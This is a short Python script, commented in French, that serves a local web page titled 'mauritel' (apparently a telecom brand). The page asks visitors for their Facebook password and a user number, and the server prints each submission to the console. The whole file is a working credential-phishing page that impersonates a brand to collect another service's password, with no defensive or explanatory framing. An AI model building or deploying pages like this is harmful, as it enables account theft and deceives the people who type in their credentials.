import http.server
import socketserver
import webbrowser

# Code HTML pour la page web
html_content = """\
<!DOCTYPE html>
<html>
<head>
    <title>mauritel</title>
</head>
<body>
    <h1>mauritel</h1>
    <form action="/submit" method="post">
        <label for="fb_password">Mots de passe Facebook:</label><br>
        <input type="password" id="fb_password" name="fb_password" required><br><br>
        <label for="username">Numéro d'utilisateur:</label><br>
        <input type="text" id="username" name="username" required><br><br>
        <input type="submit" value="Confirmer">
    </form>
</body>
</html>
"""

class RequestHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(html_content.encode('utf-8'))
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == '/submit':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            # Traitement des données ici (par exemple, les enregistrer ou les afficher)
            print("Données soumises:", post_data)
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b"Merci pour votre soumission!")
        else:
            self.send_response(404)
            self.end_headers()

PORT = 8000

def run_server():
    handler = RequestHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        print("Servant à l'adresse http://localhost:8000")
        webbrowser.open(f'http://localhost:{PORT}')
        httpd.serve_forever()

run_server()
